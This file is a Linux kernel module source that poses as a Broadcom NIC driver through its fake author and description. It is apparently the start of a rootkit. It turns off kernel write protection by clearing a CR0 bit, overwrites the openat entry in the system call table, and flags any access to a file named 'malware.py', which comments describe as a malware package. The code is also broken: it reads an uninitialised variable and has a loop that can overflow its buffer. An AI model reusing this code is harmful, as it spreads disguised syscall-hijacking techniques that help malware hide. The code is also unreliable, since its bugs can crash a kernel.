#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Broadcome");
MODULE_DESCRIPTION("NIC_Device Driver");
MODULE_VERSION("1.0");


unsigned long **SYS_CALL_TABLE;



void EnablePageWriting(void){
	write_cr0(read_cr0() & (~0x10000));

} 
void DisablePageWriting(void){
	write_cr0(read_cr0() | 0x10000);

} 

// bool StartsWith(const char *a, const char *b)
// 	{
// 		if(strncmp(a, b, strlen(b)) == 0) return 1;
// 		return 0;
// 	}


//pointer to the normal sysCall_open
asmlinkage int ( *original_open ) (int dirfd, const char *pathname, int flags); 





//Modified sysCall_open
asmlinkage int	HookOpen(int dirfd, const char *pathname, int flags){

    char letter ;
    int i = 0;

    char directory[255];
    //Need to work out how to get whole path name
    char OurFile[14] = "malware.py"; //Hardcoded file name (should be malware package name)

    // if (letter == 0x41 || letter < 0x7a) Maybe to prevent bad chars from entering string buffer
    while (letter != 0 || i < 6){ 
        //This macro copies a single simple variable from user space to kernel space. 
        //So this will copy pathname[i] to ch;
        get_user(letter, pathname+i);
        directory[i] = letter ;
        i++;
	}

    //Only triggers on open of our selected file
	if (strcmp(OurFile , directory ) == 0 ){
		printk(KERN_INFO "File Accessed!!! %s", directory);
	}

	memset(directory, 0, 255);

	
	// Return to normal sysCall_open -> OpenAt()
	return (*original_open)(dirfd, pathname, flags);
}





// Set up hooks.
static int __init SetHooks(void) {
	// Gets Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);

  // Opens the memory pages to be written
	EnablePageWriting();

  // Replaces Pointer Of Syscall_open on our syscall.
	original_open = (void*)SYS_CALL_TABLE[__NR_openat]; //Open syscall is called 'openat'
	SYS_CALL_TABLE[__NR_openat] = (unsigned long*)HookOpen;
	DisablePageWriting();

	return 0;
}






//Avoids kernel damage by removing activities from hooking
static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting();
	SYS_CALL_TABLE[__NR_openat] = (unsigned long*)original_open;
	DisablePageWriting();

	printk(KERN_INFO "HooksCleaned Up!");
}

module_init(SetHooks);
module_exit(HookCleanup);
